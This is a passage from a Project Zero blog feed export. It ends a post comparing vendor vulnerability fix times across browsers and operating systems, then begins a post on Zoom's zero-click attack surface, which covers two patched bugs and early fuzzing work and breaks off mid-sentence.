class=\"c4\"&gt;10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;72&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c28\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c9\"&gt;&lt;span class=\"c4\"&gt;Android (Pixel)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c15\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c4\"&gt;72&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;The first thing to note is that it appears that iOS received remarkably more bug reports from Project Zero than any flavor of Android did during this time period, but rather than an imbalance in research target selection, this is more a reflection of how Apple ships software. Security updates for &amp;quot;apps&amp;quot; such as iMessage, Facetime, and Safari/WebKit are all shipped as part of the OS updates, so we include those in the analysis of the operating system. On the other hand, security updates for standalone apps on Android happen through the Google Play Store, so they are not included here in this analysis.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;Despite that, all three vendors have an extraordinarily similar average time to fix. &lt;/span&gt;&lt;span&gt;With the data we have available, it&amp;#39;s hard to determine how much time is spent on each part of the vulnerability lifecycle (e.g. triage, patch authoring, testing, etc).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, open-source products do provide a window into where time is spent.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c29\" id=\"h.4ajnbffcm6lj\"&gt;&lt;span class=\"c31\"&gt;Browsers&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;For most software, we aren&amp;#39;t able to dig into specifics of the timeline. Specifically: after a vendor receives a report of a security issue, how much of the &amp;quot;time to fix&amp;quot; is spent between the bug report and &lt;/span&gt;&lt;span&gt;landing the fix&lt;/span&gt;&lt;span class=\"c4\"&gt;, and how much time is spent between landing that fix and releasing a build with the fix? The one window we do have is into open-source software, and specific to the type of vulnerability research that Project Zero does, open-source browsers.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c7\"&gt;Fix time analysis for open-source browsers&lt;/span&gt;&lt;span class=\"c7\"&gt;, by bug volume&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.9206b02c8834a0124a61f8895479290be80060e3\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"c13\"&gt;&lt;tbody&gt;&lt;tr class=\"c36\"&gt;&lt;td class=\"c19\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c27\"&gt;&lt;span class=\"c26 c7\"&gt;Browser&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c32\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;Bugs&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c6\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c7\"&gt;Avg days from bug report to &lt;/span&gt;&lt;span class=\"c7\"&gt;public patch&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;Avg days from public patch to release&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c26 c7\"&gt;Avg days from bug report to release&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c19\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c27\"&gt;&lt;span class=\"c4\"&gt;Chrome&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c32\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;40&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c6\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;5.3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;24.6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;29.9&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c19\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c27\"&gt;&lt;span class=\"c4\"&gt;WebKit&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c32\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;27&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c6\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;11.6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;61.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;72.7&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c40\"&gt;&lt;td class=\"c19\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c27\"&gt;&lt;span class=\"c4\"&gt;Firefox&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c32\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c6\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;16.6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;21.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;37.8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c19\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c27\"&gt;&lt;span class=\"c4\"&gt;Total&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c32\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;75&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c6\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;8.8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c4\"&gt;37.3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"c21\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;46.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;We can also take a look at the same data, but with each bug spread out in a histogram. In particular, the histogram of the amount of time from a fix being landed in public to that fix being shipped to users shows a clear story (in the table above, this corresponds to &amp;quot;Avg days from public patch to release&amp;quot; column:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;/p&gt;\n\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8EedoaPfZt2MIFGOHQq8x9iAQIoXCuVi1hS1HgW3kANAbNgfXatf0AT2Jl7xmjS3Au1AMjKxkTQnoLdOSgGbYbQcssFKwJ3fc3o3zD693phsOZZJBRCBOcycrVKWOXLqCREMWntlix0jEH86DAHS5Mgdk5N53Cy1CujGePRECj3JvaqrF65974g2/s1226/image1%20%287%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8EedoaPfZt2MIFGOHQq8x9iAQIoXCuVi1hS1HgW3kANAbNgfXatf0AT2Jl7xmjS3Au1AMjKxkTQnoLdOSgGbYbQcssFKwJ3fc3o3zD693phsOZZJBRCBOcycrVKWOXLqCREMWntlix0jEH86DAHS5Mgdk5N53Cy1CujGePRECj3JvaqrF65974g2/s1226/image1%20%287%29.png\" border=\"0\" alt=\"Histogram showing the distributions of time from a fix landing in public to a fix shipping for Firefox, Webkit, and Chrome. The fact that Webkit is still on the higher end of the histogram tells us that most of their time is spent shipping the fixed build after the fix has landed.\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;The table and chart together tell us a few things:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c7\"&gt;Chrome is currently the fastest of the three browsers, with time from bug report to releasing a fix in the stable channel in 30 days&lt;/span&gt;&lt;span&gt;. The time to patch is very fast here, with just an average of 5 days between the bug report and the patch landing in public. The time for that patch to be released to the public is the bulk of the overall time window, though overall we still see the Chrome (blue) bars of the histogram toward the left side of the histogram. (Important note: despite being housed within the same company, &lt;/span&gt;&lt;span&gt;Project Zero&lt;/span&gt;&lt;span&gt;&amp;nbsp;follows the same policies and procedures with Chrome that an external security researcher would follow. More information on that is available in our &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c201\" href=\"https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#earlyaccess\"&gt;Vulnerability Disclosure FAQ&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c4\"&gt;.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c7\"&gt;Firefox comes in second in this analysis, though with a relatively small number of data points to analyze. Firefox releases a fix on average in 38 days&lt;/span&gt;&lt;span class=\"c4\"&gt;. A little under half of that is time for the fix to land in public, though it&amp;#39;s important to note that Firefox intentionally delays committing security patches to reduce the amount of exposure before the fix is released. Once the patch has been made public, it releases the fixed build on average a few days faster than Chrome &amp;ndash; with the vast majority of the fixes shipping 10-15 days after their public patch.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c7\"&gt;WebKit is the outlier in this analysis, with the longest number of days to release a patch at 73 days&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;Their time to land the fix publicly is in the middle between Chrome and Firefox, but unfortunately this leaves a very long amount of time for opportunistic attackers to find the patch and exploit it prior to the fix being made available to users. This can be seen by the Apple (red) bars of the second histogram mostly being on the right side of the graph, and every one of them except one being past the 30-day mark. &lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c29\" id=\"h.bghb183lyinq\"&gt;&lt;span class=\"c31\"&gt;Analysis, hopes, and dreams&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;Overall, we see a number of promising trends emerging from the data. Vendors are fixing almost all of the bugs that they receive, and they generally do it within the 90-day deadline plus the 14-day grace period when needed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Over the past three years vendors have, for the most part, &lt;/span&gt;&lt;span&gt;accelerated&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;their patch effectively reducing the overall average time to fix to about 52 days. In 2021, there was only one 90-day deadline exceeded. We suspect that this trend may be due to the fact that responsible disclosure policies have become the de-facto standard in the industry, and vendors are more equipped to react rapidly to reports with differing deadlines. We also suspect that vendors have learned best practices from each other, as there has been increasing transparency in the industry.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c7\"&gt;One important caveat&lt;/span&gt;&lt;span&gt;: we are aware that reports from Project Zero may be outliers compared to other bug reports, in that they may receive faster action &lt;/span&gt;&lt;span&gt;as there is a tangible risk of public disclosure&lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;nbsp;(as the team will disclose if deadline conditions are not met) and Project Zero is a trusted source of reliable bug reports. We encourage vendors to release metrics, even if they are high level, to give a better overall picture of how quickly security issues are being fixed across the industry, and continue to encourage other security researchers to share their experiences.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;For Google, &lt;/span&gt;&lt;span&gt;and in particular Chrome, we suspect that the quick turnaround time on security bugs is in part due to their rapid release cycle, as well as their additional stable releases for security updates. We&amp;#39;re encouraged by Chrome&amp;#39;s recent switch from a 6-week release cycle to a &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c201\" href=\"https://blog.chromium.org/2021/03/speeding-up-release-cycle.html\"&gt;4-week release cycle&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On the Android side, we see the Pixel variant of Android releasing fixes about on par with the Samsung variants as well as iOS. Even so, we encourage the Android team to look for additional ways to speed up the application of security updates and push that segment of the industry further.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;For Apple, we&amp;#39;re pleased &lt;/span&gt;&lt;span&gt;with the&lt;/span&gt;&lt;span&gt;&amp;nbsp;acceleration of patches landing, as well as the recent lack of use of grace periods as well as lack of missed deadlines. For WebKit in particular, we hope to see a reduction in the amount of time it takes between landing a patch and shipping it out to users, &lt;/span&gt;&lt;span&gt;especially since WebKit security affects all browsers used in iOS, as WebKit is the only browser engine permitted on&lt;/span&gt;&lt;span&gt;&amp;nbsp;the iOS platform. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;For Microsoft, we suspect that the high time to fix and Microsoft&amp;#39;s reliance on the grace period are consequences of the monthly cadence of Microsoft&amp;#39;s &amp;quot;patch Tuesday&amp;quot; updates, which can make it more difficult for development teams to meet a disclosure deadline. We hope that Microsoft might consider implementing a more frequent patch cadence for security issues, or finding ways to further streamline their internal processes to land and ship code quicker.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"c29\" id=\"h.ta2a9qyxrinj\"&gt;&lt;span class=\"c31\"&gt;Moving forward&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"c8\"&gt;&lt;span class=\"c4\"&gt;This post represents some number-crunching we&amp;#39;ve done of our own public data, and we hope to continue this going forward. Now that we&amp;#39;ve established a baseline over the past few years, we plan to continue to publish an annual update to better understand how the trends progress.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c2\"&gt;&lt;span class=\"c4\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c8\"&gt;&lt;span&gt;To that end, we&amp;#39;d love to have even more insight into the processes and timelines of our vendors. We encourage all vendors to consider publishing &lt;/span&gt;&lt;span&gt;aggregate&lt;/span&gt;&lt;span&gt;&amp;nbsp;data on their time-to-fix and time-to-patch for externally reported vulnerabilities. Through more transparency, information sharing, and collaboration across the industry, we believe we can learn from each other&amp;#39;s best practices, better understand existing difficulties and hopefully make the internet a safer place for all.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/3889819885234441482/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/02/a-walk-through-project-zero-metrics.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/3889819885234441482"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/3889819885234441482"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/02/a-walk-through-project-zero-metrics.html","@title":"A walk through Project Zero metrics"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgS8EedoaPfZt2MIFGOHQq8x9iAQIoXCuVi1hS1HgW3kANAbNgfXatf0AT2Jl7xmjS3Au1AMjKxkTQnoLdOSgGbYbQcssFKwJ3fc3o3zD693phsOZZJBRCBOcycrVKWOXLqCREMWntlix0jEH86DAHS5Mgdk5N53Cy1CujGePRECj3JvaqrF65974g2/s72-c/image1%20%287%29.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-1246610633949568195","published":"2022-01-18T09:28:00.000-08:00","updated":"2022-01-18T09:28:18.118-08:00","title":{"@type":"text","#text":"Zooming in on Zero-click Exploits"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;ul.lst-kix_ef7dug197aaw-4{list-style-type:none}ul.lst-kix_ef7dug197aaw-3{list-style-type:none}.lst-kix_ef7dug197aaw-0&gt;li:before{content:\"-  \"}ul.lst-kix_ef7dug197aaw-2{list-style-type:none}ul.lst-kix_ef7dug197aaw-1{list-style-type:none}.lst-kix_ef7dug197aaw-1&gt;li:before{content:\"-  \"}ul.lst-kix_ef7dug197aaw-8{list-style-type:none}ul.lst-kix_ef7dug197aaw-7{list-style-type:none}ul.lst-kix_ef7dug197aaw-6{list-style-type:none}ul.lst-kix_ef7dug197aaw-5{list-style-type:none}ul.lst-kix_ef7dug197aaw-0{list-style-type:none}.lst-kix_ef7dug197aaw-7&gt;li:before{content:\"-  \"}.lst-kix_ef7dug197aaw-6&gt;li:before{content:\"-  \"}.lst-kix_ef7dug197aaw-8&gt;li:before{content:\"-  \"}.lst-kix_ef7dug197aaw-5&gt;li:before{content:\"-  \"}.lst-kix_ef7dug197aaw-3&gt;li:before{content:\"-  \"}.lst-kix_ef7dug197aaw-2&gt;li:before{content:\"-  \"}.lst-kix_ef7dug197aaw-4&gt;li:before{content:\"-  \"}ol{margin:0;padding:0}table td,table th{padding:0}.c7{background-color:#ffffff;color:#222222;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c18{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.2222222222222223;orphans:2;widows:2;text-align:left}.c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:\"Arial\";font-style:normal}.c13{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c14{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13.5pt;font-family:\"Arial\";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Courier New\";font-style:normal}.c15{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:13.5pt;font-family:\"Arial\";font-style:normal}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c17{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c9{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c16{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c6{font-weight:400;font-family:\"Courier New\"}.c8{color:inherit;text-decoration:inherit}.c4{border:1px solid black;margin:5px}.c21{font-size:13.5pt;font-weight:700}.c11{background-color:#ffffff;color:#222222}.c20{background-color:#ffffff}.c19{margin-left:36pt}.c12{height:11pt}.c5{text-indent:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c16\"&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;Posted by Natalie Silvanovich, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;&lt;br&gt;&lt;/span&gt;&lt;span&gt;Zoom&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a video conferencing platform that has gained popularity throughout the pandemic. Unlike other video conferencing systems that I have investigated, where one user initiates a call that other users must immediately accept or reject, Zoom calls are typically scheduled in advance and joined via an email invitation. In the past, I hadn&amp;rsquo;t prioritized reviewing Zoom because I believed that any attack against a Zoom client would require multiple clicks from a user. However, a zero-click attack against the Windows Zoom client was recently &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://blog.zoom.us/zoom-sponsors-pwn2own-security-competition/\"&gt;revealed&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;at Pwn2Own, showing that it does indeed have a fully remote attack surface. The following post details my investigation into Zoom.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;This analysis resulted in two vulnerabilities being&lt;/span&gt;&lt;span&gt;&amp;nbsp;reported to Zoom. One was a buffer overflow that affected both Zoom clients and MMR servers, and one was an info leak that is only useful to attackers on MMR servers. Both of these vulnerabilities were fixed on November 24, 2021. &lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13\" id=\"h.m2ive1t3pjbm\"&gt;&lt;span class=\"c10\"&gt;Zoom Attack Surface Overview&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;Zoom&amp;rsquo;s main feature is multi-user conference calls called meetings that support a variety of features including audio, video, screen sharing and in-call text messages. There are several ways that users can join Zoom meetings. To start, Zoom provides full-featured installable clients for many platforms, including Windows, Mac, Linux, Android and iPhone. Users can also join Zoom meetings using a browser link, but they are able to use fewer features of Zoom. Finally, users can join a meeting by dialing phone numbers provided in the invitation on a touch-tone phone, but this only allows access to the audio stream of a meeting. This research focused on the Zoom client software, as the other methods of joining calls use existing device features.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;Zoom clients support several communication features other than meetings that are available to a user&amp;rsquo;s Zoom Contacts. A Zoom Contact is a user that another user has added as a contact using the Zoom user interface. Both users must consent before they become Zoom Contacts. Afterwards, the users can send text messages to one another outside of meetings and start channels for persistent group conversations. Also, if either user hosts a meeting, they can invite the other user in a manner that is similar to a phone call: the other user is immediately notified and they can join the meeting with a single click. These features represent the zero-click attack surface of Zoom. Note that this attack surface is only available to attackers that have convinced their target to accept them as a contact. Likewise, meetings are part of the one-click attack surface only for Zoom Contacts, as other users need to click several times to enter a meeting.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c2\"&gt;That said, it&amp;rsquo;s likely not that difficult for a dedicated attacker to convince a target to join a Zoom call even if it takes multiple clicks, and the way some organizations use Zoom presents interesting attack scenarios. For example, many groups host public Zoom meetings, and Zoom supports a paid Webinar feature where large groups of unknown attendees can join a one-way video conference. It could be possible for an attacker to join a public meeting and target other attendees. Zoom also relies on a server to transmit audio and video streams, and end-to-end encryption is off by default. It could be possible for an attacker to compromise Zoom&amp;rsquo;s servers and gain access to meeting data.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c13\" id=\"h.l871so51iqig\"&gt;&lt;span class=\"c10\"&gt;Zoom Messages&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;I started out by looking at the zero-click attack surface of Zoom. Loading the Linux client into IDA, it appeared that a great deal of its server communication occurred over XMPP. Based on strings in the binary, it was clear that XMPP parsing was performed using a library called &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a class=\"c81\" href=\"https://camaya.net/gloox/\"&gt;gloox&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c2\"&gt;. I fuzzed this library using AFL and other coverage-guided fuzzers, but did not find any vulnerabilities. I then looked at how Zoom uses the data provided over XMPP.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span&gt;XMPP traffic seemed to be sent over SSL, so I located the &lt;/span&gt;&lt;span class=\"c6\"&gt;SSL_write&lt;/span&gt;&lt;span&gt;&amp;nbsp;function in the binary based on log strings, and hooked it using &lt;/span&gt;&lt;span class=\"c17\"&gt;&lt;a 